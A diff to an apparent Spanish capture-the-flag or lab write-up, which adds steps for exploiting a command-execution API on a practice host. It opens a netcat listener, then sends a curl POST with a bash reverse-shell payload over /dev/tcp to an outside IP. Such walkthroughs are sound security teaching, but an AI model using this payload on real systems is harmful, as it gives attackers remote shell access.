@@ -270,7 +270,7 @@ Creamos un script para identificar una posible respuesta al comando whoami
 ```bash
 nano param_fuzz.sh
 ```
-## 2. Agregamos esta funcion
+## 2. Agregamos esta funcion que va probar posibles ejecuciones de comandos basicos
 
 ```bash
 #!/bin/bash
@@ -307,6 +307,34 @@ curl -X POST http://secure-api-register.dl/execute \
   -d '{"command": "whoami"}' \
   -b cookie.txt
 ```
+![image](https://github.com/user-attachments/assets/58c1f531-1c77-4a08-b051-220213e94c26)
+
+Al observar que esta ejecutando comandos correctamente vamos a intentar lograr una shell reversa
+
+Nos ponemos en escucha de la shell
+
+```bash
+nc -lvnp 4545
+```
+Despues de ejecutar el comando deberias ver algo asi
+
+![image](https://github.com/user-attachments/assets/89a46e7d-a1ab-4602-bb16-677c62826425)
+
+Ahora ejecutamos la conexion
+
+```bash
+curl -X POST http://secure-api-register.dl/execute \
+    -H "Content-Type: application/json" \
+    -d '{"command": "bash -c \"bash -i >& /dev/tcp/172.17.0.1/4545 0>&1\""}' \
+    -b cookie.txt
+```
+
+![image](https://github.com/user-attachments/assets/26d7465e-27f1-402c-9aae-16c1ce0da453)
+
+Ya tenemos una shell dentro de la app 🎉🎉🎉🎉🎉
+
+
+
 
 
 
